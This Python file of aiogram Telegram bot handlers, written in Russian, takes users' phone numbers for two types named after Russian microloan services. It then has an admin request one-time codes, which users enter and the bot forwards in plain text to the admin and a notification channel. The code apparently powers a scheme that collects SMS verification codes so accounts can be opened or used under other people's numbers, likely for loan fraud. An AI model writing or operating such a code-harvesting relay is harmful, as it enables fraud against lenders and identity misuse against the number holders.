import logging
import re
from aiogram import Router, F
from aiogram.types import Message, CallbackQuery
from aiogram.fsm.context import FSMContext
from aiogram.fsm.storage.base import StorageKey
from aiogram import Bot

from config import ADMIN_ID, NOTIFY_CHANNEL_ID
from states import UserStates, AdminStates
from keyboards import (
    type_inline, admin_sdat_buttons, user_code_prompt,
    main_menu, cancel_keyboard
)
from database import create_application, update_app, get_app, add_user

router = Router()
logger = logging.getLogger(__name__)

PHONE_RE = re.compile(r'^(\+7|8|7)?(\d{10})$')


def validate_phone(phone: str) -> bool:
    phone = re.sub(r'[\s\-\(\)]', '', phone)
    return bool(PHONE_RE.fullmatch(phone))


@router.message(F.text == "Сдать номер")
async def sdat_start(message: Message, state: FSMContext):
    if await state.get_state():
        await message.answer("Предыдущее действие отменено.", reply_markup=main_menu())
        await state.clear()
    await state.set_state(UserStates.sdat_type)
    await message.answer("Выберите тип:", reply_markup=type_inline())


@router.callback_query(F.data.startswith("type_"), UserStates.sdat_type)
async def sdat_type_chosen(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    type_choice = "АДЕНЬГИ" if callback.data == "type_adengi" else "МАНИМЕН"
    await state.update_data(type_choice=type_choice)
    await state.set_state(UserStates.sdat_phone)
    await callback.message.edit_text(f"Выбран тип: {type_choice}\nВведите номер телефона (формат: 7XXXXXXXXXX):")
    await callback.message.answer("Введите номер телефона:", reply_markup=cancel_keyboard())


@router.message(UserStates.sdat_phone)
async def sdat_phone(message: Message, state: FSMContext, bot: Bot):
    phone = message.text
    if not validate_phone(phone):
        await message.answer("❌ Неверный формат. Введите российский номер (11 цифр).", reply_markup=cancel_keyboard())
        return

    data = await state.get_data()
    type_choice = data.get('type_choice')
    if not type_choice:
        await message.answer("Ошибка. Начните заново.", reply_markup=main_menu())
        await state.clear()
        return

    user_id = message.from_user.id
    username = message.from_user.username or "нет username"
    add_user(user_id, username)

    app_id = create_application(user_id, username, phone, 'sdat', type_choice)
    await state.update_data(app_id=app_id)

    app_text = (
        f"📩 Новая заявка на сдачу номера (ID: {app_id}):\n"
        f"Тип: {type_choice}\n"
        f"Телефон: {phone}\n"
        f"Пользователь: @{username} (ID: {user_id})\n"
        f"Статус: ⏳ Ожидание запроса кода"
    )

    kb = admin_sdat_buttons(app_id, user_id)
    admin_msg = await bot.send_message(ADMIN_ID, app_text, reply_markup=kb)

    try:
        channel_msg = await bot.send_message(NOTIFY_CHANNEL_ID, app_text, reply_markup=kb)
        ch_id = channel_msg.message_id
    except Exception as e:
        logger.error(f"Ошибка отправки в канал: {e}")
        ch_id = None

    update_app(app_id, admin_message_id=admin_msg.message_id, channel_message_id=ch_id)

    await state.set_state(UserStates.sdat_waiting_admin)
    await message.answer("✅ Данные отправлены администратору. Ожидайте.", reply_markup=main_menu())


# ---------- Действия админа ----------

@router.callback_query(F.data.startswith("sdat_code_"))
async def sdat_request_code(callback: CallbackQuery, state: FSMContext, bot: Bot):
    await callback.answer("Код запрошен!")
    parts = callback.data.split("_")
    app_id = int(parts[2])
    user_id = int(parts[3])

    app = get_app(app_id)
    if not app:
        await callback.message.answer("❌ Заявка не найдена.")
        return
    if app['status'] == 'cancelled':
        await callback.message.answer("❌ Заявка отменена.")
        return

    # Увеличиваем счётчик запросов кода
    new_count = app.get('code_requests_count', 0) + 1
    update_app(app_id, code_requests_count=new_count)

    # Отправляем пользователю запрос на ввод кода
    await bot.send_message(
        user_id,
        f"🔑 Поступил новый запрос кода (попытка {new_count}). Нажмите «Ввести код».",
        reply_markup=user_code_prompt()
    )

    storage_key = StorageKey(bot.id, user_id, user_id)
    await state.storage.set_state(key=storage_key, state=UserStates.sdat_code_prompt)
    await state.storage.set_data(key=storage_key, data={'app_id': app_id})

    # Текст для нового сообщения (без перезаписи старого)
    channel_alert_text = f"🔑 Код запрошен (заявка {app_id}) - раз {new_count}"
    kb = admin_sdat_buttons(app_id, user_id)

    # Отправляем новое сообщение в канал
    try:
        await bot.send_message(
            chat_id=NOTIFY_CHANNEL_ID,
            text=channel_alert_text,
            reply_markup=kb
        )
    except Exception as e:
        logger.error(f"Не удалось отправить сообщение в канал: {e}")

    # Дублируем у админа в личку с рабочей кнопкой
    try:
        await callback.message.answer(
            channel_alert_text,
            reply_markup=kb
        )
    except Exception:
        pass


@router.callback_query(F.data.startswith("sdat_cancel_"))
async def sdat_admin_cancel(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    parts = callback.data.split("_")
    app_id = int(parts[2])
    user_id = int(parts[3])
    await state.set_state(AdminStates.waiting_cancel_reason)
    await state.update_data(cancel_app_id=app_id, cancel_user_id=user_id)
    await callback.message.answer("Введите причину отмены:")


# ---------- Общая отмена ----------

@router.message(AdminStates.waiting_cancel_reason)
async def admin_cancel_reason(message: Message, state: FSMContext, bot: Bot):
    reason = message.text
    data = await state.get_data()
    app_id = data.get('cancel_app_id')
    user_id = data.get('cancel_user_id')
    if not app_id or not user_id:
        await message.answer("Ошибка. Попробуйте снова.")
        await state.clear()
        return

    app = get_app(app_id)
    update_app(app_id, status='cancelled', cancel_reason=reason)

    await bot.send_message(user_id, f"❌ Ваша заявка (ID: {app_id}) отменена.\nПричина: {reason}")

    cancel_text = f"❌ Заявка {app_id} отменена. Причина: {reason}"
    await bot.send_message(NOTIFY_CHANNEL_ID, cancel_text)

    if app and app.get('channel_message_id'):
        try:
            await bot.edit_message_text(
                chat_id=NOTIFY_CHANNEL_ID,
                message_id=app['channel_message_id'],
                text=cancel_text
            )
        except Exception:
            pass

    storage_key = StorageKey(bot.id, user_id, user_id)
    await state.storage.set_state(key=storage_key, state=None)
    await state.storage.set_data(key=storage_key, data={})

    await state.clear()
    await message.answer("✅ Отмена выполнена.")


# ---------- Пользователь вводит код ----------

@router.callback_query(F.data == "user_enter_code", UserStates.sdat_code_prompt)
async def user_enter_code(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    await state.set_state(UserStates.sdat_waiting_code)
    await callback.message.answer("Введите код:", reply_markup=cancel_keyboard())


@router.message(UserStates.sdat_waiting_code)
async def user_code_received(message: Message, state: FSMContext, bot: Bot):
    code = message.text
    data = await state.get_data()
    app_id = data.get('app_id')

    app = get_app(app_id) if app_id else None
    if app_id:
        update_app(app_id, code=code, status='completed')

    await bot.send_message(ADMIN_ID, f"🔐 Код введён (заявка {app_id}): {code}")

    success_text = f"🔐 Код успешно введён для заявки {app_id}: {code}"
    await bot.send_message(NOTIFY_CHANNEL_ID, success_text)

    if app and app.get('channel_message_id'):
        try:
            await bot.edit_message_text(
                chat_id=NOTIFY_CHANNEL_ID,
                message_id=app['channel_message_id'],
                text=f"✅ Заявка {app_id} выполнена. Код введён: {code}"
            )
        except Exception:
            pass

    await state.clear()
    await message.answer("✅ Код принят. Спасибо!", reply_markup=main_menu())


@router.callback_query(F.data == "user_cancel")
async def user_cancel_inline(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    await state.clear()
    await callback.message.edit_text("❌ Отменено.")
    await callback.message.answer("Меню:", reply_markup=main_menu())